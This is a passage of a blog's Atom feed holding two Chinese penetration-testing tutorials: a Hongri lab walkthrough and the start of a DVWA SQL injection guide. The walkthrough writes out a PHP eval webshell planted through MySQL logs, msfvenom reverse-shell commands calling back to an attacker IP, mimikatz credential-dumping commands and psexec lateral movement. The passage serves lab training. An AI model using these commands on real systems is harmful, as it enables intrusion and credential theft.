    <link href="http://ms02423.top/2023/07/17/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%B8%80/"/>
    <id>http://ms02423.top/2023/07/17/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E4%B8%80/</id>
    <published>2023-07-17T07:59:39.000Z</published>
    <updated>2023-07-17T12:26:20.644Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一. 环境搭建"></a>一. 环境搭建</h1><ol><li>实验环境拓扑如下：</li></ol><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201224481.png" alt="image-20230717201224481"></p><ol start="2"><li>下载好镜像文件，下载地址: <a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a> (13G，需要百度网盘会员)</li></ol><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201236420.png" alt="image-20230717201236420"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201255042.png" alt="image-20230717201255042"></p><p>3.需要模拟内网和外网两个网段， Win7 虚拟机相当于网关服务器，所以需要两张网卡，一个用来向外网提供web服务，一个是通向内网。添加网络设配器如下图</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201301398.png" alt="image-20230717201301398"></p><p>将 Win7 的网络适配器 1 设置成 VMnet1 仅主机模式（内网），网络适配器 2 设置成 NAT 模式（外网）</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201316726.png" alt="image-20230717201316726"></p><p>而 Win2003、Win2008 网络适配器设置成VMnet1仅主机模式(内网)。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201728089.png" alt="image-20230717201728089"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201735459.png" alt="image-20230717201735459"></p><p>网络配置完成，这三台虚拟主机默认开机密码都是 hongrisec@2019（开机提示密码已过期，更改为 123qwe.即可）登录查看三台虚拟机的ip地址如下：</p><p>windows7：(内：192.168.52.143 &#x2F; 外：192.168.44.134(外网根据你的物理机进行分配))</p><p>windows2003：(内：192.168.52.141)</p><p>windows2008:（内：192.168.52.138）</p><p>开机之后更新一下Vmware TOOls</p><p>更新之前</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201741877.png" alt="image-20230717201741877"></p><p>更新之后</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201745978.png" alt="image-20230717201745978"></p><p>最后在 Win7 外网服务器主机的 C 盘找到 PhpStudy 启动 Web 服务</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201750739.png" alt="image-20230717201750739"></p><p>靶场的环境搭建完毕</p><h1 id="二．Web渗透"><a href="#二．Web渗透" class="headerlink" title="二．Web渗透"></a>二．Web渗透</h1><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>(1)我们使用nmap进行扫描 nmap -T4 -A 192.168.44.134(nmap的使用-A:全面扫描 -T4: 快速扫描)</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201756235.png" alt="image-20230717201756235"></p><p>扫描工具很多，能不能扫出有用信息还是看字典是否强大，可以看到目标80端口开启，3306端口开放</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201801786.png" alt="image-20230717201801786"></p><p>(2)我们访问<a href="http://192.168.44.134/phpmyadmin%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0">http://192.168.44.134/phpmyadmin，可以看到数据库管理后台</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201805263.png" alt="image-20230717201805263"></p><p>我们猜测用户名和密码是root root，可以看到登录成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201810373.png" alt="image-20230717201810373"></p><p>(3)我们尝试into outfile写入木马进行getshell，想在网站内部写入木马，需要知道网站的绝对路径，可以通过报错获取路径，用select @@basedir;查询，通过查询phpinfo.php等等多种方法，这里我们使用select @@basedir;进行查询。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201815220.png" alt="image-20230717201815220"></p><p>(4)然后通过执行select ‘<? php eval($_POST[pass]);?>’into outfile ‘C:&#x2F;phpStudy&#x2F;www&#x2F;webshell.php’;(注意这里的符号都是英文状态，不然会报错)将木马写入到网站的根目录</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201821490.png" alt="image-20230717201821490"></p><p>我们可以看到写入失败，通过查询得知这里不能使用into outfile的方式写入shell，可以通过执行“show variables like ‘%secure_file%’;”查询下是否能直接写入shell。这里secure_file_priv的值为NULL，说明不能使用into outfile的方式写入shell。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201826755.png" alt="image-20230717201826755"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201832598.png" alt="image-20230717201832598"></p><p>(5) 尝试日志写入shell</p><p>查看日志状态：show variables like ‘%general%’,我们可以看到是关闭的</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201929098.png" alt="image-20230717201929098"></p><p>这里我们说一下general_log和general_log_file：</p><p>mysql打开general_log开关之后，所有对数据库的操作都将记录在general_log_file指定的文件目录中，以原始的状态来显示，如果将general_log开关打开，general_log_file指定一个php文件，则查询的操作将会全部写入到general_log_file指定的文件，可以通过访问general_log_file指定的文件来获取webshell。</p><p>开启日志记录：set global general_log &#x3D; “ON”;再查询日志状态，是开启的</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201937649.png" alt="image-20230717201937649"></p><p>(6)执行命令：set global general_log_file&#x3D;‘C:&#x2F;phpStudy&#x2F;www&#x2F;web.php’，指定日志写入到网站根目录的 web.php 文件.</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201942056.png" alt="image-20230717201942056"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201945590.png" alt="image-20230717201945590"></p><p>访问日志文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201950976.png" alt="image-20230717201950976"></p><p>(7)我们连接蚁剑(使用蚁剑的时候，记得关闭杀毒软件)，密码是pass，我们可以看到连接成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201954632.png" alt="image-20230717201954632"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717201959556.png" alt="image-20230717201959556"></p><h2 id="2-WEB后台上传GetShell"><a href="#2-WEB后台上传GetShell" class="headerlink" title="2.WEB后台上传GetShell"></a>2.WEB后台上传GetShell</h2><p>(1)在我们目录扫描中，还扫到了我们的网站备份源码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202003194.png" alt="image-20230717202003194"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202007242.png" alt="image-20230717202007242"></p><p>(2) 我们搭建yxcms 系统，浏览器访问<a href="http://192.168.44.134/yxcms/">http://192.168.44.134/yxcms/</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202035991.png" alt="image-20230717202035991"></p><p>我们根据提示成功进入网站后台</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202041997.png" alt="image-20230717202041997"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202047557.png" alt="image-20230717202047557"></p><p>(3) 可以新建一个木马文件，前台模块-管理模块文档-新建</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202052813.png" alt="image-20230717202052813"></p><p>我们可以看到文件已上传，可通过前面下载的beifen.rar文件来查找acomment.php文件来确定文件上传的路径：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202149936.png" alt="image-20230717202149936"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202155848.png" alt="image-20230717202155848"></p><p>(4) 蚁剑成功连接</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202200316.png" alt="image-20230717202200316"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202205043.png" alt="image-20230717202205043"></p><p>(5) 留言板处存在xss漏洞：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202209323.png" alt="image-20230717202209323"></p><p> <img src="/./../imgs/$%7Bfiilename%7D/image-20230717202215123.png" alt="image-20230717202215123"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202219228.png" alt="image-20230717202219228"></p><h1 id="三-内网信息收集"><a href="#三-内网信息收集" class="headerlink" title="三. 内网信息收集"></a>三. 内网信息收集</h1><h2 id="1-使用CS植入Backdoor"><a href="#1-使用CS植入Backdoor" class="headerlink" title="1.使用CS植入Backdoor"></a>1.使用CS植入Backdoor</h2><p>(1)我们在kali或者Windows里面安装CS,我们在kali里面启动CS，我们需要开2个终端</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202223970.png" alt="image-20230717202223970"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202230105.png" alt="image-20230717202230105"></p><p>(2) 先新建监听，主机IP填写kali的ip</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202244663.png" alt="image-20230717202244663"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202253586.png" alt="image-20230717202253586"></p><p>(3)我们生成后门</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202258456.png" alt="image-20230717202258456"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202302900.png" alt="image-20230717202302900"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202324680.png" alt="image-20230717202324680"></p><p>(4)生成后，使用蚁剑进行上传到靶机</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202329458.png" alt="image-20230717202329458"></p><p>(5) 上传后使用蚁剑中使用终端命令行执行start web.exe, 可以看到我们 CS 客户端靶机上线</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202333618.png" alt="image-20230717202333618"></p><p>(6) 我们进行提权到 SYSTEM 系统权限账户。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202337578.png" alt="image-20230717202337578"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202341534.png" alt="image-20230717202341534"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202345357.png" alt="image-20230717202345357"></p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><p>(1) 由于受害机默认60秒进行一次回传，为了实验效果我们这里把时间设置成5，但实际中频率不宜过快，容易被发现。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202352939.png" alt="image-20230717202352939"></p><p>(2) 开始简单进行信息收集，常用到的有以下</p><ol><li>ipconfig &#x2F;all  查看本机ip，所在域</li><li>route print   打印路由信息</li><li>net view    查看局域网内其他主机名</li><li>arp -a     查看arp缓存</li><li>whoami</li><li>net start    查看开启了哪些服务</li><li>net share    查看开启了哪些共享</li><li>net share ipc$ 开启ipc共享</li><li>net share c$  开启c盘共享</li><li>net use \192.168.xx.xx\ipc$ “” &#x2F;user:””  与192.168.xx.xx建立空连接</li><li>net use \192.168.xx.xx\c$ “密码” &#x2F;user:”用户名” 建立c盘共享</li><li>dir \192.168.xx.xx\c$\user  查看192.168.xx.xx c盘user目录下的文件</li><li>net config Workstation  查看计算机名、全名、用户名、系统版本、工作站、域、登录域</li><li>net user         查看本机用户列表</li><li>net user &#x2F;domain     查看域用户</li><li>net localgroup administrators  查看本地管理员组（通常会有域用户）</li><li>net view &#x2F;domain     查看有几个域</li><li>net user 用户名 &#x2F;domain  获取指定域用户的信息</li><li>net group &#x2F;domain    查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</li><li>net group 组名 &#x2F;domain  查看域中某工作组</li><li>net group “domain admins” &#x2F;domain 查看域管理员的名字</li><li>net group “domain computers” &#x2F;domain 查看域中的其他主机名</li><li>net group “doamin controllers” &#x2F;domain 查看域控制器（可能有多台）</li></ol><p>(3) 使用ipconfig &#x2F;all 判断是否存在域, 可以看到存在gob.org域</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202358348.png" alt="image-20230717202358348"></p><p>也可以执行命令net config Workstation 来查看当前计算机名、全名、用户名、系统版本、工作站、域、登录域等全面的信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202401729.png" alt="image-20230717202401729"></p><p>(4) 获取域内用户的详细信息：wmic useraccount get &#x2F;all</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202406745.png" alt="image-20230717202406745"></p><p>(5) 查看是否存在杀毒进程：tasklist</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202413344.png" alt="image-20230717202413344"></p><p>除了使用CS外，我们也可以使用msf进入操作。</p><h2 id="3-msf"><a href="#3-msf" class="headerlink" title="3.msf"></a>3.msf</h2><p>(1)使用msf生成shell.exe</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202417411.png" alt="image-20230717202417411"></p><p>(2) 将shell.exe使用蚁剑上传到web服务器中。msf开启监听</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202424375.png" alt="image-20230717202424375"></p><p>use exploit&#x2F;multi&#x2F;handler</p><p>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</p><p>set lhost 192.168.44.130</p><p>set lport 6666</p><p>exploit</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202429791.png" alt="image-20230717202429791"></p><p>我们可以看到没有反弹成功，我们换一个端口4444</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202433299.png" alt="image-20230717202433299"></p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.44.130 LPORT&#x3D;4444 -f exe -o door.exe</p><p>(3) 运行door.exe，msf成功反弹shell</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202438821.png" alt="image-20230717202438821"></p><p>(4) msf中getsystem也可直接提权</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202445259.png" alt="image-20230717202445259"></p><p>（5）MSF使用_MSF中kiwi(mimikatz)模块的使用</p><p>1) 首先:提权到system权限：</p><p>一是当前的权限是administrator用户；</p><p>二是利用其它手段先提权到administrator用户。然后administrator用户可以直接在meterpreter_shell中使用命令getsystem提权到system权限。 </p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202454259.png" alt="image-20230717202454259"></p><p>2)进程迁移</p><p>kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。</p><p>所以如果目标系统是64位的，则必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制。</p><p>查看进程信息:ps</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202458887.png" alt="image-20230717202458887"></p><p>把进程迁移到PID为504这个程序中(因为当前用户)：</p><p>注：因为目标系统是64位的所以需要把meterpreter进程迁移到一个64位程序的进程中。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202504681.png" alt="image-20230717202504681"></p><ol><li>load kiwi #加载kiwi模块</li><li>help kiwi #查看kiwi模块的使用</li><li>creds_all：       #列举所有凭据</li><li>creds_kerberos：    #列举所有kerberos凭据</li><li>creds_msv：       #列举所有msv凭据</li><li>creds_ssp：       #列举所有ssp凭据</li><li>creds_tspkg：      #列举所有tspkg凭据</li><li>creds_wdigest：     #列举所有wdigest凭据</li><li>dcsync：        #通过DCSync检索用户帐户信息</li><li>dcsync_ntlm：      #通过DCSync检索用户帐户NTLM散列、SID和RID</li><li>golden_ticket_create： #创建黄金票据</li><li>kerberos_ticket_list： #列举kerberos票据</li><li>kerberos_ticket_purge： #清除kerberos票据</li><li>kerberos_ticket_use：  #使用kerberos票据</li><li>kiwi_cmd：       #执行mimikatz的命令，后面接mimikatz.exe的命令</li><li>lsa_dump_sam：     #dump出lsa的SAM</li><li>lsa_dump_secrets：   #dump出lsa的密文</li><li>password_change：    #修改密码</li><li>wifi_list：       #列出当前用户的wifi配置文件</li><li>wifi_list_shared：   #列出共享wifi配置文件&#x2F;编码</li></ol><p>3)该命令可以列举系统中的明文密码: creds_all #列举所有凭据</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202510733.png" alt="image-20230717202510733"></p><h1 id="四-内网横向渗透"><a href="#四-内网横向渗透" class="headerlink" title="四. 内网横向渗透"></a>四. 内网横向渗透</h1><p> 利用MSF横向渗透可以使用cs和MSF两种方式进行横向渗透。这里以CS作为演示。(2008,2003可以使用永恒之蓝进行)</p><h2 id="1-第一步就是生成exe，然后拿到shell-上面已经讲过"><a href="#1-第一步就是生成exe，然后拿到shell-上面已经讲过" class="headerlink" title="1.第一步就是生成exe，然后拿到shell(上面已经讲过)"></a>1.第一步就是生成exe，然后拿到shell(上面已经讲过)</h2><h2 id="2-进行目标主机信息收集"><a href="#2-进行目标主机信息收集" class="headerlink" title="2.进行目标主机信息收集"></a>2.进行目标主机信息收集</h2><h2 id="3-横向探测"><a href="#3-横向探测" class="headerlink" title="3.横向探测"></a>3.横向探测</h2><p>(1)获取到一个 cs 的 beacon 后可以目标内网情况和端口开放情况</p><p>在 beacon 上右键 -&gt; 目标 -&gt; 选择 net view 或者 port scan</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202515512.png" alt="image-20230717202515512"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202520013.png" alt="image-20230717202520013"></p><p>(2). 执行后可以在 Targets 选项卡看到扫描出来的主机</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202528330.png" alt="image-20230717202528330"></p><p>(3). 用 cs 的 hashdump 读内存密码：hashdump，用 mimikatz 读注册表密码：logonpasswords</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202534737.png" alt="image-20230717202534737"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202542242.png" alt="image-20230717202542242"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202547109.png" alt="image-20230717202547109"></p><h2 id="4-横向移动"><a href="#4-横向移动" class="headerlink" title="4.横向移动"></a>4.横向移动</h2><p>这里有很多种方式，可以：</p><p>1.)cs 上开通 socks 通道，在攻击机上用 proxychains 将攻击机的 msf 代入内网，但是 cs 的 socks 代理不稳定</p><p>2.)ew 添加转接隧道，在攻击机上用 proxychains 将攻击机的 msf 代入内网</p><p>3.)cs 派生到 msf，msf 使用 socks4a 代理进内网，但是并不稳定</p><p>4.)cs 派生到 msf，msf 使用使用 autoroute 添加路由进内网</p><p>5.)用 frp 创建 socks5 代理</p><h2 id="5-SMB-Beacon"><a href="#5-SMB-Beacon" class="headerlink" title="5.SMB Beacon"></a>5.SMB Beacon</h2><p>另外这里还要介绍下 cs 派生 SMB Beacon</p><p>SMB Beacon 使用命名管道通过父级 Beacon 进行通讯，当两个 Beacons 链接后，子 Beacon 从父 Beacon 获取到任务并发送。因为链接的 Beacons 使用 Windows 命名管道进行通信，此流量封装在 SMB 协议中，所以 SMB Beacon 相对隐蔽，绕防火墙时可能发挥奇效</p><p>简单来说，SMB Beacon 有两种方式</p><p>第一种直接派生一个孩子，目的为了进一步盗取内网主机的 hash</p><p>1)新建一个 Listener，payload 设置为 Beacon SMB：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202552846.png" alt="image-20230717202552846"></p><p>2)选择后会反弹一个子会话，在 external 的 ip 后面会有一个链接的小图标：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202557088.png" alt="image-20230717202557088"></p><p>这就是派生的 SMB Beacon，当前没有连接</p><p>可以在主 Beacon 上用 link host 连接它，或者 unlink host 断开它</p><p>第二种在已有的 beacon 上创建监听，用来作为跳板进行内网穿透</p><p>前提是能够通过 shell 之类访问到内网其他主机</p><h2 id="6-psexec使用凭证登录其他主机"><a href="#6-psexec使用凭证登录其他主机" class="headerlink" title="6.psexec使用凭证登录其他主机"></a>6.psexec使用凭证登录其他主机</h2><p>前面横向探测已经获取到内网内的其他 Targets 以及读取到的凭证信息</p><p>于是可以尝试使用 psexec 模块登录其他主机</p><p>1)右键选择一台非域控主机 ROOT-TVI862UBEH 的 psexec 模块</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202604062.png" alt="image-20230717202604062"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202608269.png" alt="image-20230717202608269"></p><p>2)执行效果如下:</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202611941.png" alt="image-20230717202611941"></p><p>3)这几条命令，执行后得到了 ROOT-TVI862UBEH 这台主机的 beacon</p><p>如法炮制得到了域控主机 OWA 的 beacon:</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717202615966.png" alt="image-20230717202615966"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一. 环境搭建&quot;&gt;&lt;/a&gt;一. 环境搭建&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;实验环境拓扑如下：&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;/./../imgs/$</summary>
      
    
    
    
    <category term="web" scheme="http://ms02423.top/categories/web/"/>
    
    
    <category term="靶机-红日" scheme="http://ms02423.top/tags/%E9%9D%B6%E6%9C%BA-%E7%BA%A2%E6%97%A5/"/>
    
  </entry>
  
  <entry>
    <title>DVWA之SQL注入</title>
    <link href="http://ms02423.top/2023/06/30/DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://ms02423.top/2023/06/30/DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/</id>
    <published>2023-06-30T01:30:30.000Z</published>
    <updated>2023-07-17T11:57:16.154Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-DVWA介绍"><a href="#一-DVWA介绍" class="headerlink" title="一.DVWA介绍"></a>一.DVWA介绍</h1><h2 id="1-1-DVWA简介"><a href="#1-1-DVWA简介" class="headerlink" title="1.1 DVWA简介"></a>1.1 DVWA简介</h2><p>DVWA是一款基于PHP和MYSQL开发的web靶场练习平台，集成了常见的web漏洞如sql注入,XSS，密码破解等常见漏洞。旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p><h2 id="1-2-DVWA模块"><a href="#1-2-DVWA模块" class="headerlink" title="1.2 DVWA模块"></a>1.2 DVWA模块</h2><p>DVWA共有十个模块：</p><ol><li><p>Brute Force（暴力（破解））</p></li><li><p>Command Injection（命令行注入）</p></li><li><p>CSRF（跨站请求伪造）</p></li><li><p>File Inclusion（文件包含）</p></li><li><p>File Upload（文件上传）</p></li><li><p>Insecure CAPTCHA （不安全的验证码）</p></li><li><p>SQL Injection（SQL注入）</p></li><li><p>SQL Injection（Blind）（SQL盲注）</p></li><li><p>XSS（Reflected）（反射型跨站脚本</p></li><li><p>XSS（Stored）（存储型跨站脚本）<br>1.3 DVWA 安全级别</p></li></ol><p>一般情况下，DVWA一共有四种安全级别，分别为：</p><p>Low、Medium、High、Impossible</p><h1 id="二-DVWA的搭建"><a href="#二-DVWA的搭建" class="headerlink" title="二.DVWA的搭建"></a>二.DVWA的搭建</h1><h2 id="2-1-phpstudy的搭建"><a href="#2-1-phpstudy的搭建" class="headerlink" title="2.1 phpstudy的搭建"></a>2.1 phpstudy的搭建</h2><p>phpstudy下载地址<a href="">小皮面板(phpstudy) - 让天下没有难配的服务器环境！ (xp.cn)</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193611383.png" alt="image-20230717193611383"></p><p>下载完后双击压缩包中的应用程序</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193648976.png" alt="image-20230717193648976"></p><p>选择路径，这里我存储在D盘中</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193711099.png" alt="image-20230717193711099"></p><p>然后就安装成功了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193721741.png" alt="image-20230717193721741"></p><h2 id="2-2DVWA的搭建"><a href="#2-2DVWA的搭建" class="headerlink" title="2.2DVWA的搭建"></a>2.2DVWA的搭建</h2><p><a href="https://raw.githubusercontent.com/zb423/image/main/image-20230629205445441.png">DVWA的官网DVWA - 该死的易受攻击的Web应用程序</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193733244.png" alt="image-20230717193733244"></p><p> 将其解压到PHPstudy路径下的PHPTutorial下的WWW目录下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193740387.png" alt="image-20230717193740387"></p><p>解压后进入DVWA下的config文件打开config.inc.php文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193746988.png" alt="image-20230717193746988"></p><p>将p@ssw0rd 修改为 root </p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193754318.png" alt="image-20230717193754318"></p><p>然后在浏览器中访问<a href="http://127.0.0.1/DVWA-master/setup.php,%E7%84%B6%E5%90%8E%E7%82%B9%E5%87%BB%E7%BD%91%E7%AB%99%E4%B8%8B%E6%96%B9%E7%9A%84Create/Reset">http://127.0.0.1/DVWA-master/setup.php,然后点击网站下方的Create/Reset</a> Database按钮</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193801916.png" alt="image-20230717193801916"></p><p> 接着会跳转到DVWA的登录页面默认用户名：admin 默认密码：password 成功登录</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193811229.png" alt="image-20230717193811229"></p><h1 id="三-SQL注入漏洞"><a href="#三-SQL注入漏洞" class="headerlink" title="三.SQL注入漏洞"></a>三.SQL注入漏洞</h1><h2 id="3-1-SQL注入原理"><a href="#3-1-SQL注入原理" class="headerlink" title="3.1 SQL注入原理"></a>3.1 SQL注入原理</h2><p>  就是通过把恶意的sql命令插入web表单递交给服务器，或者输入域名或页面请求的查询字符串递交到服务器，达到欺骗服务器，让服务器执行这些恶意的sql命令，从而让攻击者，可以绕过一些机制，达到直接访问数据库的一种攻击手段。</p><h2 id="3-2-SQL注入分类"><a href="#3-2-SQL注入分类" class="headerlink" title="3.2 SQL注入分类"></a>3.2 SQL注入分类</h2><p>(1)数字型        （2）字符型       （3）报错注入     （4）Boollean注入                （5）时间注入</p><h2 id="3-3-SQL注入思路"><a href="#3-3-SQL注入思路" class="headerlink" title="3.3 SQL注入思路"></a>3.3 SQL注入思路</h2><p>(1).判断是否存在注入，注入是字符型还是数字型</p><p>(2).猜解SQL查询语句中的字段数</p><p>(3).确定回显位置</p><p>(4).获取当前数据库</p><p>(5).获取数据库中的表</p><p>(6).获取表中的字段名</p><p>(7).得到数据</p><h2 id="3-4-SQL注入绕过方法"><a href="#3-4-SQL注入绕过方法" class="headerlink" title="3.4 SQL注入绕过方法"></a>3.4 SQL注入绕过方法</h2><p>(1)注释符号绕过         (2)大小写绕过         (3)内联注释绕过</p><p>(4)特殊编码绕过         (5)空格过滤绕过       (6)过滤or and xor not 绕过</p><h1 id="四-SQL注入漏洞的分析"><a href="#四-SQL注入漏洞的分析" class="headerlink" title="四.SQL注入漏洞的分析"></a>四.SQL注入漏洞的分析</h1><h2 id="4-1-定义"><a href="#4-1-定义" class="headerlink" title="4.1 定义"></a>4.1 定义</h2><p>SQL注入（SQLi）是一种注入攻击，可以执行恶意SQL语句。它通过将任意SQL代码插入数据库查询，使攻击者能够完全控制Web应用程序后面的数据库服务器。攻击者可以使用SQL注入漏洞绕过应用程序安全措施；可以绕过网页或Web应用程序的身份验证和授权，并检索整个SQL数据库的内容；还可以使用SQL注入来添加，修改和删除数据库中的记录。</p><h2 id="4-2-原因"><a href="#4-2-原因" class="headerlink" title="4.2 原因"></a>4.2 原因</h2><p>SQL 注入漏洞存在的原因，就是拼接SQL参数。也就是将用于输入的查询参数，直接拼接在SQL语句中，导致了SQL注入漏洞。</p><p>web 开发人员无法保证所有的输入都已经过滤</p><p>攻击者利用发送给服务器的输入参数构造可执行的 SQL 代码（可加入到 get 请求、 post 谓求、 http 头信思、 cookie 中）</p><p>数据库未做相应的安全配置</p><h1 id="五-SQL-Injection"><a href="#五-SQL-Injection" class="headerlink" title="五.SQL Injection"></a>五.SQL Injection</h1><h2 id="1-low级别"><a href="#1-low级别" class="headerlink" title="1.low级别"></a>1.low级别</h2><p>(1)判断注入类型，是数字型注入，还是字符型注入</p><p>我们输入1，看到正确返回值</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193826003.png" alt="image-20230717193826003"></p><p> 我们输入1’，看到报错了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193835502.png" alt="image-20230717193835502"> 我们可以猜出到是字符型注入，我们继续输入1’ and ‘1’ &#x3D;’1和1’ and ‘1’&#x3D;’2。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193900346.png" alt="image-20230717193900346"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194013365.png" alt="image-20230717194013365"></p><p>我们根据id&#x3D;1’报错和id&#x3D;1’ and ‘1’&#x3D;’1正确，我们可以知道是字符型注入，查看源代码知道就是字符型注入。</p><p>(2)判断字段数                                     order by </p><p>我们使用order by 进行判断字段数， 至到order by 进行报错时候就是字段数</p><p>id&#x3D;1’ order by 1#没有报错</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194035231.png" alt="image-20230717194035231"></p><p> id&#x3D;1’ order by 2# 没有报错</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194043999.png" alt="image-20230717194043999"></p><p> id&#x3D;1’ order by 3#时报错了，说明字段只有2列</p><p><img 